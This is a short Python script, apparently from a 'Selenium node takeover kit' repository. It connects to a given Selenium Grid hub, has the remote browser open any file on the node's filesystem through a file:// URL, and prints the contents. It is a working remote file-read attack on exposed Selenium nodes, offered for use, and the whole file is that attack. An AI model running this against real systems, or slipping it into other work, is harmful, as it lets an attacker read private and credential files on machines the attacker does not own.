#!/usr/bin/env python
# https://github.com/JonStratton/selenium-node-takeover-kit/blob/master/examples/selenium_node_cat.py
# 
# A quick and light version of selenium_node_download.py that doesnt handle binary files.
# Simply creates a connection and loads the remote file with the browser.

import sys, getopt
from selenium import webdriver

hub_url, remote_file = None, None
myopts, args = getopt.getopt(sys.argv[1:],':u:r:')
for o, a in myopts:
    if o == '-u':
        hub_url = a
    elif o == '-r':
        remote_file = a

# Nothing special about the driver here. Probably would work on any browser
options = webdriver.FirefoxOptions()
driver = webdriver.Remote(
   command_executor=hub_url,
   desired_capabilities=options.to_capabilities()
   )

# Just get the local file and print it.
try:
    driver.get('file://%s' % (remote_file))
    print(driver.page_source)
finally:
    driver.quit()

sys.exit(0)
